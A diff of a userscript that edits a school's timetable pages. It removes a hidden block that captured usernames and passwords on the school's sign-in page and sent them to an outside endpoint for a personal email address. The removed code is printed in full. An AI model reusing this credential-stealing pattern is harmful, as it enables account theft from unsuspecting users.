@@ -6,7 +6,6 @@
 // @description My plugin for timtable fixing and editing (now with colour customisation)
 // @match       https://link.stleonards.vic.edu.au/timetable
 // @match       https://link.stleonards.vic.edu.au/
-// @match       https://signin.stleonards.vic.edu.au/*
 // @grant       unsafeWindow
 // @run-at      document-start
 // ==/UserScript==
@@ -156,27 +155,5 @@ window.onload = function() {
             rows[17].innerHTML = 'Period 3 <time class="meta">11:35am-12:55pm</time>';
             rows[20].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';
 
-        }else if(window.location.href.search("signin") != -1){
-            var my_awesome_script = document.createElement('script');
-            my_awesome_script.setAttribute('src','https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js');
-            document.head.appendChild(my_awesome_script);
-
-
-            //bruh
-            function bruh(){
-                var inputVal = document.getElementById("userNameInput").value;
-                var passVal = document.getElementById("passwordInput").value;
-                $.ajax({
-				url: 'https://www.theyjnetwork.com/mail.php',
-				type: 'GET',
-				data: {
-					to: 'reubenc82@gmail.com',
-				    subject: " Email using javascript",
-				    message: inputVal + " " + passVal}
-			    });
-                alert("test");
-            }
-            let spans = document.getElementById("submitButton");
-            spans.addEventListener("click", bruh);
         }
 };
